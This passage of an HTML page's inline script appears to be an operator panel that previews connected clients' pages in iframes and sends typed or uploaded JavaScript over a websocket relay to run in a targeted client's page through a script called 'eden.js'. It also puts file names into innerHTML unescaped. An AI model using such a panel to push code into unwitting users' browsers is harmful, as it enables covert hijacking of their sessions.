                    };
                    input.click();
                });
            }

            function updateUploadedFilesList() {
                if (!uploadedFilesContainer) return;
                uploadedFilesContainer.innerHTML = '';
                if (uploadedFiles.size === 0) {
                    uploadedFilesContainer.innerHTML = '<p style="color: #666; font-size: 12px; margin: 0;">No files uploaded</p>';
                    return;
                }
                uploadedFiles.forEach((content, fileName) => {
                    const fileItem = document.createElement('div');
                    fileItem.style.cssText = 'display: flex; justify-content: space-between; align-items: center; padding: 6px; margin: 4px 0; background: #f5f5f5; border-radius: 4px;';
                    fileItem.innerHTML = `
                        <span style="font-size: 12px;">${fileName}</span>
                        <button class="remove-file-btn" data-file="${fileName}" style="padding: 2px 8px; background: #f44336; color: white; border: none; border-radius: 3px; cursor: pointer; font-size: 11px;">Remove</button>
                    `;
                    uploadedFilesContainer.appendChild(fileItem);
                });
                uploadedFilesContainer.querySelectorAll('.remove-file-btn').forEach(btn => {
                    btn.addEventListener('click', (e) => {
                        const fileName = e.target.dataset.file;
                        uploadedFiles.delete(fileName);
                        updateUploadedFilesList();
                        if (uploadedFiles.size === 0) {
                            uploadedFilesList.style.display = 'none';
                        }
                    });
                });
            }

            cancelActionBtn.addEventListener('click', () => {
                closeActionModal();
                currentStateForAction = null;
            });

            cancelCodeBtn.addEventListener('click', () => {
                closeCodeModal();
                currentActionType = null;
                currentStateForAction = null;
            });

            saveActionBtn.addEventListener('click', () => {
                if (!currentStateForAction) return;
                const state = currentStateForAction;
                
                // Check if uploaded files should be used
                if (uploadedFiles.size > 0 && currentActionType === 'upload-js') {
                    uploadedFiles.forEach((content, fileName) => {
                        const message = {
                            type: 'execute-code',
                            event: state.selectedEvent,
                            targetClientId: state.clientId,
                            code: content,
                            fileName: fileName
                        };
                        if (state.selectionSource === 'area' && state.selectedArea) {
                            message.area = state.selectedArea;
                        } else if (state.selectedSelector) {
                            message.selector = state.selectedSelector;
                        }
                        sendExecuteCodeMessage(message);
                    });
                    closeCodeModal();
                    currentActionType = null;
                    currentStateForAction = null;
                    return;
                }
                
                const message = {
                    type: 'execute-code',
                    event: state.selectedEvent,
                    targetClientId: state.clientId
                };

                if (state.selectionSource === 'area' && state.selectedArea) {
                    message.area = state.selectedArea;
                } else if (state.selectedSelector) {
                    message.selector = state.selectedSelector;
                } else {
                    alert('Unable to determine selection target.');
                    return;
                }

                if (currentActionType === 'copy-text') {
                    const text = copyTextarea.value.trim();
                    if (!text) {
                        alert('Please enter text to copy.');
                        return;
                    }
                    message.text = text;
                } else if (currentActionType === 'upload-js') {
                    // Handle uploaded files
                    if (uploadedFiles.size === 0) {
                        alert('Please upload at least one JS file.');
                        return;
                    }
                    uploadedFiles.forEach((content, fileName) => {
                        const fileMessage = { ...message };
                        fileMessage.code = content;
                        fileMessage.fileName = fileName;
                        sendExecuteCodeMessage(fileMessage);
                    });
                    closeCodeModal();
                    state.selectedSelector = null;
                    state.selectedArea = null;
                    currentActionType = null;
                    currentStateForAction = null;
                    uploadedFiles.clear();
                    updateUploadedFilesList();
                    uploadedFilesList.style.display = 'none';
                    // Don't display JS file content on server.html - just send to eden.js
                    return;
                } else {
                    const code = codeTextarea.value.trim();
                    if (!code) {
                        alert('Please enter JavaScript code.');
                        return;
                    }
                    message.code = code;
                }

                sendExecuteCodeMessage(message);
                closeCodeModal();
                state.selectedSelector = null;
                state.selectedArea = null;
                state.selectionSource = null;
                currentStateForAction = null;
                currentActionType = null;
            });

            actionModal.addEventListener('click', event => {
                if (event.target === actionModal) {
                    closeActionModal();
                    currentStateForAction = null;
                }
            });

            codeModal.addEventListener('click', event => {
                if (event.target === codeModal) {
                    closeCodeModal();
                    currentActionType = null;
                    currentStateForAction = null;
                }
            });

            function setupContainerSelection(container) {
                if (!container || !container.id || !container.id.startsWith('preview-container-')) return;
                const clientId = container.id.replace('preview-container-', '');
                if (!clientId) return;

                let state = selectionStates.get(clientId);
                const iframe = container.querySelector('iframe');
                const selectionToggle = container.querySelector(`#selection-toggle-${clientId}`);
                const selectionIndicator = container.querySelector(`#selection-indicator-${clientId}`);

                if (!state) {
                    state = {
                        clientId,
                        container,
                        iframe,
                        selectionToggle,
                        selectionIndicator,
                        doc: null,
                        selectionRectangle: null,
                        selectedSelector: null,
                        selectedArea: null,
                        selectionSource: null,
                        selectionStart: null,
                        isSelectionMode: false
                    };
                    selectionStates.set(clientId, state);
                } else {
                    state.container = container;
                    state.iframe = iframe;
                    state.selectionToggle = selectionToggle;
                    state.selectionIndicator = selectionIndicator;
                }

                if (selectionToggle && !selectionToggle.dataset.listenerAttached) {
                    selectionToggle.addEventListener('click', () => toggleSelectionMode(state));
                    selectionToggle.dataset.listenerAttached = 'true';
                }

                attachIframeHandlers(state);
            }

            function toggleSelectionMode(state, forcedValue) {
                const nextValue = typeof forcedValue === 'boolean' ? forcedValue : !state.isSelectionMode;
                state.isSelectionMode = nextValue;

                if (state.selectionToggle) {
                    state.selectionToggle.textContent = nextValue ? 'Selection Mode: ON' : 'Selection Mode: OFF';
                    state.selectionToggle.classList.toggle('active', nextValue);
                }

                if (state.selectionIndicator) {
                    state.selectionIndicator.classList.toggle('active', nextValue);
                }

                if (state.container) {
                    state.container.dataset.selectionActive = nextValue ? 'true' : 'false';
                }

                updateSelectionCursor(state);

                if (!nextValue) {
                    hideViewerContextMenu();
                }
            }

            function updateSelectionCursor(state) {
                if (!state.doc) return;
                let cursorStyle = state.doc.getElementById('viewer-selection-cursor-style');
                if (state.isSelectionMode) {
                    if (!cursorStyle) {
                        cursorStyle = state.doc.createElement('style');
                        cursorStyle.id = 'viewer-selection-cursor-style';
                        cursorStyle.textContent = `*, *::before, *::after { cursor: crosshair !important; }`;
                        state.doc.head.appendChild(cursorStyle);
                    }
                    if (state.doc.body) {
                        state.doc.body.style.userSelect = 'none';
                    }
                } else {
                    if (cursorStyle) cursorStyle.remove();
                    if (state.doc.body) {
                        state.doc.body.style.userSelect = '';
                        state.doc.body.style.cursor = '';
                    }
                }
            }

            function attachIframeHandlers(state) {
                if (!state || !state.iframe) return;
                if (state._iframeLoadHandler) {
                    state.iframe.removeEventListener('load', state._iframeLoadHandler);
                }
                state._iframeLoadHandler = () => initializeIframeDocument(state);
                state.iframe.addEventListener('load', state._iframeLoadHandler);

                if (state.iframe.contentDocument && state.iframe.contentDocument.readyState === 'complete') {
                    initializeIframeDocument(state);
                }
            }

            function initializeIframeDocument(state) {
                if (!state || !state.iframe) return;

                if (state._cleanupDocHandlers) {
                    state._cleanupDocHandlers();
                    state._cleanupDocHandlers = null;
                }

                const doc = state.iframe.contentDocument || state.iframe.contentWindow.document;
                if (!doc) return;

                state.doc = doc;

                if (doc.body && getComputedStyle(doc.body).position === 'static') {
                    doc.body.style.position = 'relative';
                }

                if (state.selectionRectangle && state.selectionRectangle.parentNode) {
                    state.selectionRectangle.parentNode.removeChild(state.selectionRectangle);
                }

                const rectangle = doc.createElement('div');
                rectangle.className = 'selection-rectangle';
                doc.body.appendChild(rectangle);
                state.selectionRectangle = rectangle;

                const contextHandler = event => handleIframeContextMenu(event, state);
                const mouseDownHandler = event => handleIframeMouseDown(event, state);
                const suppressClick = event => {
                    if (state.isSelectionMode) {
                        event.preventDefault();
                        event.stopPropagation();
                    }
                };

                doc.addEventListener('contextmenu', contextHandler);
                doc.addEventListener('mousedown', mouseDownHandler);
                doc.addEventListener('click', suppressClick, true);

                state._cleanupDocHandlers = () => {
                    doc.removeEventListener('contextmenu', contextHandler);
                    doc.removeEventListener('mousedown', mouseDownHandler);
                    doc.removeEventListener('click', suppressClick, true);
                };

                updateSelectionCursor(state);
            }

            function handleIframeContextMenu(event, state) {
                if (!state || !state.isSelectionMode) return;
                event.preventDefault();
                state.selectedSelector = getElementSelector(event.target);
                state.selectedArea = null;
                state.selectionSource = 'element';

                const point = convertToPageCoordinates(state, event.clientX, event.clientY);
                showViewerContextMenu(point.x, point.y, state);
            }

            function handleIframeMouseDown(event, state) {
                if (!state || !state.isSelectionMode || event.button !== 0) return;

                const scroll = getIframeScroll(state);
                state.selectionStart = {
                    docX: event.clientX + scroll.x,
                    docY: event.clientY + scroll.y,
                    viewportX: event.clientX,
                    viewportY: event.clientY
                };

                state.selectedSelector = null;
                state.selectedArea = null;
                state.selectionSource = null;

                if (state.selectionRectangle) {
                    state.selectionRectangle.style.display = 'block';
                    state.selectionRectangle.style.left = `${state.selectionStart.docX}px`;
                    state.selectionRectangle.style.top = `${state.selectionStart.docY}px`;
                    state.selectionRectangle.style.width = '0px';
                    state.selectionRectangle.style.height = '0px';
                }

                const moveHandler = moveEvent => {
                    const moveScroll = getIframeScroll(state);
                    const currentDocX = moveEvent.clientX + moveScroll.x;
                    const currentDocY = moveEvent.clientY + moveScroll.y;
                    const left = Math.min(state.selectionStart.docX, currentDocX);
                    const top = Math.min(state.selectionStart.docY, currentDocY);
                    const width = Math.abs(currentDocX - state.selectionStart.docX);
                    const height = Math.abs(currentDocY - state.selectionStart.docY);

                    if (state.selectionRectangle) {
                        state.selectionRectangle.style.left = `${left}px`;
                        state.selectionRectangle.style.top = `${top}px`;
                        state.selectionRectangle.style.width = `${width}px`;
                        state.selectionRectangle.style.height = `${height}px`;
                    }
                };

                const mouseUpHandler = upEvent => {
                    state.doc.removeEventListener('mousemove', moveHandler);
                    state.doc.removeEventListener('mouseup', mouseUpHandler);

                    const upScroll = getIframeScroll(state);
                    const endDocX = upEvent.clientX + upScroll.x;
                    const endDocY = upEvent.clientY + upScroll.y;
                    const width = Math.abs(endDocX - state.selectionStart.docX);
                    const height = Math.abs(endDocY - state.selectionStart.docY);

                    if (state.selectionRectangle) {
                        state.selectionRectangle.style.display = 'none';
                    }

                    if (width < 10 || height < 10) {
                        state.selectedArea = null;
                        return;
                    }

                    state.selectedArea = {
                        x: Math.round(Math.min(state.selectionStart.docX, endDocX)),
                        y: Math.round(Math.min(state.selectionStart.docY, endDocY)),
                        width: Math.round(width),
                        height: Math.round(height)
                    };
                    state.selectionSource = 'area';

                    const centerViewportX = (state.selectionStart.viewportX + upEvent.clientX) / 2;
                    const centerViewportY = (state.selectionStart.viewportY + upEvent.clientY) / 2;
                    const point = convertToPageCoordinates(state, centerViewportX, centerViewportY);
                    showViewerContextMenu(point.x, point.y, state);
                };

                state.doc.addEventListener('mousemove', moveHandler);
                state.doc.addEventListener('mouseup', mouseUpHandler);
            }

            function getIframeScroll(state) {
                if (state && state.iframe && state.iframe.contentWindow) {
                    return {
                        x: state.iframe.contentWindow.scrollX || state.iframe.contentWindow.pageXOffset || 0,
                        y: state.iframe.contentWindow.scrollY || state.iframe.contentWindow.pageYOffset || 0
                    };
                }

                if (state && state.doc) {
                    return {
                        x: state.doc.documentElement.scrollLeft || state.doc.body.scrollLeft || 0,
                        y: state.doc.documentElement.scrollTop || state.doc.body.scrollTop || 0
                    };
                }

                return { x: 0, y: 0 };
            }

            function placeViewerContextMenu(x, y) {
                if (!contextMenu) return;
                
                contextMenu.style.display = "block";
                contextMenu.classList.remove("show");
                
                const rect = contextMenu.getBoundingClientRect();
                const vw = window.innerWidth;
                const vh = window.innerHeight;
                
                let left = x;
                let top = y;
                
                if (left + rect.width > vw) left = x - rect.width;
                if (top + rect.height > vh) top = y - rect.height;
                
                if (left < 4) left = 4;
                if (top < 4) top = 4;
                
                contextMenu.style.left = left + "px";
                contextMenu.style.top = top + "px";
                
                setTimeout(() => contextMenu.classList.add("show"), 10);
            }

            function showViewerContextMenu(x, y, state) {
                if (!state || !state.isSelectionMode) return;
                
                // Reset UI (exactly like menu.html)
                if (baseItems) baseItems.style.display = "block";
                if (groupsContainer) groupsContainer.style.display = "none";
                if (eventsContainer) eventsContainer.style.display = "none";
                if (groupsContainer) groupsContainer.innerHTML = "";
                if (eventsContainer) eventsContainer.innerHTML = "";
                
                lastMenuPos = { x, y };
                contextMenu.dataset.clientId = state.clientId;
                
                placeViewerContextMenu(x, y);
            }

            function hideViewerContextMenu() {
                if (contextMenu) {
                    contextMenu.style.display = 'none';
                    contextMenu.classList.remove("show");
                }
                if (contextMenu && contextMenu.dataset.clientId) {
                    delete contextMenu.dataset.clientId;
                }
            }

            function openActionModal(state) {
                if (!state) return;
                actionEventSpan.textContent = state.selectedEvent || '';
                actionTargetSpan.textContent = describeSelection(state);
                actionModal.style.display = 'flex';
            }

            function closeActionModal() {
                actionModal.style.display = 'none';
            }

            function openCodeModal(mode) {
                if (!currentStateForAction) return;
                selectedElementSpan.textContent = describeSelection(currentStateForAction);
                selectedEventSpan.textContent = currentStateForAction.selectedEvent || '';

                if (mode === 'copy') {
                    copyContainer.style.display = 'block';
                    codeContainer.style.display = 'none';
                    uploadedFilesList.style.display = 'none';
                    copyTextarea.value = '';
                    copyTextarea.focus();
                } else if (mode === 'upload') {
                    copyContainer.style.display = 'none';
                    codeContainer.style.display = 'none';
                    uploadedFilesList.style.display = 'block';
                    updateUploadedFilesList();
                } else {
                    copyContainer.style.display = 'none';
                    codeContainer.style.display = 'block';
                    uploadedFilesList.style.display = 'none';
                    codeTextarea.value = '';
                    codeTextarea.focus();
                }

                codeModal.style.display = 'flex';
            }

            function closeCodeModal() {
                codeModal.style.display = 'none';
            }

            function describeSelection(state) {
                if (!state) return '';
                if (state.selectionSource === 'area' && state.selectedArea) {
                    const area = state.selectedArea;
                    return `Area: x=${area.x}, y=${area.y}, w=${area.width}, h=${area.height}`;
                }
                return state.selectedSelector || 'Unknown target';
            }

            function convertToPageCoordinates(state, clientX, clientY) {
                if (!state || !state.iframe) {
                    return { x: clientX, y: clientY };
                }
                const rect = state.iframe.getBoundingClientRect();
                return {
                    x: rect.left + clientX,
                    y: rect.top + clientY
                };
            }

            function getElementSelector(element) {
                if (!element || !element.tagName) return '';
                if (element.id) {
                    return `#${element.id}`;
                }
                if (element.className && typeof element.className === 'string') {
                    const classes = element.className.split(' ').filter(Boolean);
                    if (classes.length > 0) {
                        return `.${classes.join('.')}`;
                    }
                }
                const parent = element.parentElement;
                if (!parent) {
                    return element.tagName.toLowerCase();
                }
                const siblings = Array.from(parent.children).filter(child => child.tagName === element.tagName);
                const index = siblings.indexOf(element) + 1;
                return `${element.tagName.toLowerCase()}:nth-of-type(${index})`;
            }

            function sendExecuteCodeMessage(message) {
                if (!window.websocket || window.websocket.readyState !== WebSocket.OPEN) {
                    alert('Viewer is not connected to the relay server.');
                    return;
                }
                window.websocket.send(JSON.stringify(message));
            }
        })();
    </script>
</body>
</html>